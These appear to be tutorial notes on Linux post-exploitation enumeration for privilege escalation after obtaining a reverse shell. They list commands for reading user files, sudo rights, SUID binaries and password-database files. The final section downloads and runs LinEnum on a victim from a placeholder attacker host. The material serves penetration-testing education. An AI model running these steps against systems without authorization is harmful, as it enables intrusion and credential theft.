1 Why is Enumeration Important?
===============================

  The first thing you should do once you obtain a reverse shell into a
  linux system is `enumeration'.

  Enumeration is all about gathering meaningful information regarding
  the system you're dealing with.

  A proper enumeration procedure will allow you to understand the
  specific configurations being deployed on the system, and, more
  importantly, what are the vulnerable aspects of the system.

  Once you understand the vulnerabilities, you can then exploit them to
  elevate your privileges.

  This is why enumeration is key.


2 What to Enumerate?
====================

  In terms of what to enumerate, the following areas are keypoint to
  focus on:

  - hardware architecture
  - kernel version
  - linux distribution version

  - users and groups (/etc/passwd)
  - access to powerful groups (docker, ...)
  - sudo configuration (sudo -l)

  - fs directories (/home/*, /opt/*, /var/www/html/*)
  - suid/guid binaries

  - local services
  - network interfaces

  - software installed with versions
  - backups / saved session
  - repositories under version control systems (git, svn)

  - cronjobs (discussed in a later video)
  - capabilities (discussed in a later video)


3 How to Enumerate?
===================

  For each of the previous areas mentioned, the following command can
  help you:

  - hardware architecture
    ,----
    | uname -a
    `----

  - kernel version
    ,----
    | uname -r
    `----

  - linux distribution version
    ,----
    | uname -a
    | lsb_release -a
    `----

  - environment variables
    ,----
    | env
    `----

  - users and groups
  ,----
  | cat /etc/passwd
  | cat /etc/passwd | cut -d ':' -f 1 > users.txt
  | 
  | cat /etc/group
  | cat /etc/group | cut -d ':' -f 1 > groups.txt
  `----

  - access to powerful groups
  ,----
  | groups
  `----

  - sudo configuration
    ,----
    | sudo -l
    `----

  - fs directories (/home/*, /opt/*, /var/www/*)
    ,----
    | ls -lha /opt
    | ls -lha /home/*
    | ls -lha /var/www/*
    `----

  - suid/guid binaries
  ,----
  | find / -perm -u=s  2>/dev/null
  | find / -perm -g=s -type f 2>/dev/null
  `----

  - local services
  ,----
  | netstat -lpnt
  | netstat -lpnu 
  `----

  - network interfaces
  ,----
  | ip a
  `----

  - software installed with versions
  ,----
  | which <SOFTWARE>
  | ls -lha /usr/local/sbin/*
  | ls -lha /usr/local/bin/*
  | ls -lha /usr/bin/*
  `----

  - backups / saved session / database files
  ,----
  | find / -name "*.bkp" -ls
  | find / -name "*.kdbx" -ls
  `----

  - repositories under version control systems (git, svn)
  ,----
  | git log
  | git checkout a66922842dfbe801ef8e884bb7f0f48823adaf29
  | git switch -
  `----

  - cronjobs

  | discussed in a later video
  `----

  - capabilities

4 Automated Scripts
===================

  Finally, there are also automated scripts that check common security
  mis-configuration, vulnerable software versions, and so on.

  The most famous one are listed below:

  - <https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>
  - <https://github.com/rebootuser/LinEnum>

  To use these scripts, the following steps will work:

  1. Download the script in your attacker machine
     ,----
     | wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
     `----

  2. Transfer the file into the victim machine
     ,----
     | python3 -m http.server 1337 # attacker
     | wget http://<ATTACKER-IP>:1337/LinEnum.sh -O /tmp/LinEnum.sh
     `----

  3. Make the script executable
     ,----
     | chmod +x /tmp/LinEnum.sh
     `----

  4. Execute the script and save the output in a file
     ,----
     | ./LinEnum.sh | tee LinEnum-output.txt
     `----
